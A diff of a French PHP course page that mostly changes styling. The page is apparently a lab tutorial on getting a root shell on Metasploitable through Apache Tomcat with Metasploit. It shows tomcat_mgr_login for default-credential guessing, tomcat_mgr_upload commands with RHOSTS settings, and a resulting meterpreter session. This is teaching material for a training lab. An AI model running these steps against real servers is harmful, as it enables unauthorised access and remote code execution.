@@ -35,7 +35,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
     </head>
 
     <?php // Corps de la page ?>
-    <body>
+    <body style="background-color: rgba(61,72,92)">
         <?php 
         // Inclusion de la barre de navigation
         require_once('menuCourses.php'); 
@@ -68,7 +68,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             </div>
             <div class="row justify-content-center">
                 <div class="group col-sm-8">
-                    <p style="font-size: 18px; text-align: justify">
+                    <p style="font-size: 18px; text-align: justify; color: white">
                         </br>
                         Dans ce cours nous allons apprendre comment obtenir un shell avec les droits root sur un hôte-cible en utilisant Tomcat-Apache.
                         </br>
@@ -83,7 +83,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
            
             <div class="row justify-content-center">
                 <div class="group col-sm-8">
-                    <p style="font-size: 18px; text-align: justify">
+                    <p style="font-size: 18px; text-align: justify; color: white">
                         </br>
                         </br>
                         On cherche le module tomcat_mgr_login sur metasploitable.
@@ -113,11 +113,11 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             </div>
             <div class="row justify-content-center">
                 <div class="group col-sm-8">
-                    <p style="font-size: 18px;">
-                    </br>
-                    </br>
-                    L’exploit attribuera des listes de noms d'utilisateur et de mots de passe par défaut.
-                    On peut alors executer l'exploit:
+                    <p style="font-size: 18px; color: white">
+                        </br>
+                        </br>
+                        L’exploit attribuera des listes de noms d'utilisateur et de mots de passe par défaut.
+                        On peut alors executer l'exploit:
                         </br>
                     </p>
                 </div>
@@ -144,7 +144,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             </div>
             <div class="row justify-content-center">
                 <div class="group col-sm-8">
-                    <p style="font-size: 18px;">
+                    <p style="font-size: 18px; color: white">
                         </br>
                         On récupère les identifiants obtenus pour les utiliser dans le prochain exploit tomcat_mgr_upload
                         </br>
@@ -154,12 +154,12 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             <div class="row justify-content-center">
                 <div class="group col-sm-0"> 
                     <p style="font-size: 18px;">   
-                    <samp>
-                        <kbd> search tomcat_mgr_upload </kbd>
-                        </br>
-                        <kbd> use exploit/multi/http/tomcat_mgr_upload  </kbd>
-                        </br>
-                        <kbd> show options </kbd>
+                        <samp>
+                            <kbd> search tomcat_mgr_upload </kbd>
+                            </br>
+                            <kbd> use exploit/multi/http/tomcat_mgr_upload  </kbd>
+                            </br>
+                            <kbd> show options </kbd>
                         </samp>
                         </br>
                     </p>
@@ -176,7 +176,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             </div>
             <div class="row justify-content-center">
                 <div class="group col-sm-8">
-                    <p style="font-size: 18px;">
+                    <p style="font-size: 18px; color: white">
                         </br>
                         Renomer RHOSTS, RPORT et HttpPassword, HttpUsername, puis exécuter l'exploit :
                         </br>
@@ -185,7 +185,7 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
             </div>
             <div class="row justify-content-center">
                 <div class="group col-sm-0"> 
-                    <p style="font-size: 18px;">   
+                    <p style="font-size: 18px">   
                     <samp>
                         <kbd> set RHOSTS *ipcible* </kbd>
                         </br>
@@ -212,19 +212,21 @@ if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur conn
                 </div>
             </div>
             <div class="row justify-content-center">
-        <div class="group col-sm-8">
-          <p style="font-size: 18px;">
-          Nous avons donc exploité une vulnérabilité de Tomcat-Apache avec Metasploit. 
-          Nous avons donc ouvert un meterpreter en cours d’exécution, ce qui nous a donné un shell sur notre terminal. 
-          </br>
-          </br>
-          </br>
-          </br>
-          </p>
-        </div>
-      </div>
-            
-            
+                <div class="group col-sm-8">
+                    <p style="font-size: 18px; color: white">
+                    Nous avons donc exploité une vulnérabilité de Tomcat-Apache avec Metasploit. 
+                    Nous avons donc ouvert un meterpreter en cours d’exécution, ce qui nous a donné un shell sur notre terminal. 
+                    </br>
+                    </br>
+                    </br>
+                    </br>
+                    </p>
+                </div>
+            </div>           
         </div>
     </body>
+    <?php 
+    // Inclusion de la barre de navigation
+    require_once('footerCourses.php'); 
+    ?>
 </html>
